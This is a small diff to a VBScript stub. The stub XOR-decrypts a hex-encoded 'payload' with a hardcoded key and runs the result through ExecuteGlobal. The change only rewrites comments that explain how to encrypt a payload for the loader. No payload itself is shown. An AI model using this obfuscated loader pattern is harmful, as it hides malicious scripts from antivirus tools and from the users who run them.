@@ -10,6 +10,11 @@ wend:
 k="DECRYPT_PASSWORD":
 for i = 0 to Len(b) - 1 Step 2:
 	c = c & Chr(Asc(Chr("&H" & Mid(b, i + 1, 2))) xor Asc(Mid(k, ((i / 2)mod Len(k)) + 1, 1))):
-  'You need to encrypt your VBS payload with the same algorithm
+	' You can encrypt your payload as like
+	' x = strPayload, y = strKey, z = strEncryptedHexPayload
+	'
+	' (Pseudo code)
+	' z = (x XOR y)
+	' z => to hexadecimal
 Next:
 ExecuteGlobal c:
